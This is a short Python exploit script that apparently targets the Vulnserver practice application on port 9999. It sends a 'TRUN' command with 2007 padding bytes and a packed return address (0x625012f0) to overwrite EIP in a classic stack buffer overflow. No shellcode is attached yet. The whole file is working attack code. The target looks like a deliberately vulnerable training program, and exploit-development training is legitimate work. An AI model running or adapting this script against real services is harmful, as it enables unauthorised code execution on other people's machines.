import socket, sys
from struct import pack

ip = sys.argv[1]
port = 9999

prefix = b'TRUN '
buffer = b'.' * 2007
eip = pack('<L', 0x625012f0)

payload = prefix + buffer + eip

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)

